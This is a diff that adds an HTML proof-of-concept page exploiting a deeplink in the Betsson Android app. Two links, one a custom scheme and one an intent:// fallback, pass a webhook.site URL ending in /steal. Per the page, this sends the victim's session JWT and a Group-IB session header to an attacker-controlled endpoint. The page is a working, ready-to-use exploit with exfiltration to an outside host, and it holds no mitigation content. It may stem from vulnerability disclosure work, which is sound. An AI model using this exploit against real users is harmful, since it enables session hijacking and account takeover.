@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Betsson Deeplink PoC</title></head>
+<body style="font-family:sans-serif;padding:24px;line-height:1.6">
+  <h2>Betsson session-token leak PoC</h2>
+  <p>Replace <code>WEBHOOK_ID</code> below with your webhook.site token, then open this page
+     in the device's Chrome (with Betsson installed + logged in) and tap a button.</p>
+
+  <!-- 1) Plain custom-scheme link (works on tap in Chrome) -->
+  <p>
+    <a id="scheme" href="betsson-oneapp://promotion/?url=https://webhook.site/WEBHOOK_ID/steal"
+       style="display:inline-block;padding:14px 20px;background:#ff6a00;color:#fff;border-radius:8px;text-decoration:none">
+       Trigger via custom scheme
+    </a>
+  </p>
+
+  <!-- 2) intent:// form (more reliable across Chrome versions) -->
+  <p>
+    <a id="intent"
+       href="intent://promotion/?url=https://webhook.site/WEBHOOK_ID/steal#Intent;scheme=betsson-oneapp;package=com.betsson.android;end"
+       style="display:inline-block;padding:14px 20px;background:#333;color:#fff;border-radius:8px;text-decoration:none">
+       Trigger via intent:// (fallback)
+    </a>
+  </p>
+
+  <hr>
+  <p>After tapping, check your webhook.site page — the incoming request to <code>/steal</code>
+     carries the victim's <code>auth</code> (session JWT) and <code>native_groupIB_session</code> headers.</p>
+</body>
+</html>
